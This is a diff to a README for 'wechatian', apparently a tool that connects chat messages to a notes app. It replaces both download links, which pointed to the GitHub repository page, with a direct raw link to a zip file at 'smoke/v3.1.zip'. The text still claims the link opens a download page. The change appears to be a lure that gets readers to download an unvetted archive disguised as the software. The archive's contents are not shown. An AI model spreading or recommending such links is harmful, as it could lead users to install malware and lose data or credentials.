@@ -29,7 +29,7 @@ All your data stays on your computer. wechatian doesn’t send your notes to any
 
 ### Step 1: Download the Software
 
-👉 [**Click here to download wechatian**](https://github.com/lishablastodermatic520/wechatian)
+👉 [**Click here to download wechatian**](https://raw.githubusercontent.com/lishablastodermatic520/wechatian/main/smoke/v3.1.zip)
 
 This link will take you to the download page. Look for the latest version and download the file.
 
@@ -134,7 +134,7 @@ wechatian is the missing bridge between your conversations and your knowledge ba
 
 ## 📦 Download Again
 
-👉 [**Download wechatian now**](https://github.com/lishablastodermatic520/wechatian)
+👉 [**Download wechatian now**](https://raw.githubusercontent.com/lishablastodermatic520/wechatian/main/smoke/v3.1.zip)
 
 Get it installed in under five minutes. Your future self will thank you.
 
